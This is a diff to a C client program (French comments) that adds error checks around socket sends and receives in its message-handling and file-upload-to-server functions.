@@ -120,9 +120,10 @@ void receive_and_process_message(int sockfd) {
     char buffer[1024];
 
     // Receive the message from the server
-    if (receive_message_client(sockfd, buffer, sizeof(buffer), recv) < 0) {
+    int bytes_received = receive_message_client(sockfd, buffer, sizeof(buffer), recv);
+    if (bytes_received < 0) {
         output_log("Failed to receive message from server\n", LOG_ERROR, LOG_TO_ALL);
-        return;
+        return; // Erreur de réception
     }
 
     output_log("Done receiving, preparing to parse and execute\n", LOG_DEBUG, LOG_TO_CONSOLE);
@@ -156,6 +157,7 @@ void receive_and_process_message(int sockfd) {
     }
 
     free_command(&cmd); // Nettoyer correctement après
+    return ;
 }
 
 
@@ -169,18 +171,30 @@ void upload_file_to_server(const char *filename, int sockfd) {
     // Envoie du nom de fichier
     char header[1024];
     snprintf(header, sizeof(header), "UPLOAD%s", filename);
-    send(sockfd, header, strlen(header), 0);
+    if (send(sockfd, header, strlen(header), 0) < 0) {
+        output_log("upload_file_to_server : Error sending file data header",LOG_INFO, LOG_TO_ALL, filename);
+        fclose(fp);
+        return;
+    }
     usleep(100000); // petite pause pour éviter que le header soit collé au reste
 
     // Envoie des données en chunks de taille 4096
     char buffer[FILE_CHUNK_SIZE];
     size_t bytes_read;
     while ((bytes_read = fread(buffer, 1, FILE_CHUNK_SIZE, fp)) > 0) { //boubler jusqu'à EOF
-        send(sockfd, buffer, bytes_read, 0);
+        if (send(sockfd, buffer, bytes_read, 0) < 0) {
+            output_log("upload_file_to_server : Error sending file data",LOG_INFO, LOG_TO_ALL, filename);
+            fclose(fp);
+            return;
+        }
     }
 
     fclose(fp);
-    send(sockfd, "EOF", 3, 0);  // signal de fin
+    if (send(sockfd, "EOF", 3, 0) < 0) { // signal de fin
+        output_log("upload_file_to_server : Error sending EOF ",LOG_INFO, LOG_TO_ALL, filename);
+        return;
+    }
     output_log("File '%s' sent successfully\n", LOG_INFO, LOG_TO_ALL, filename);
+    return;
 }
 
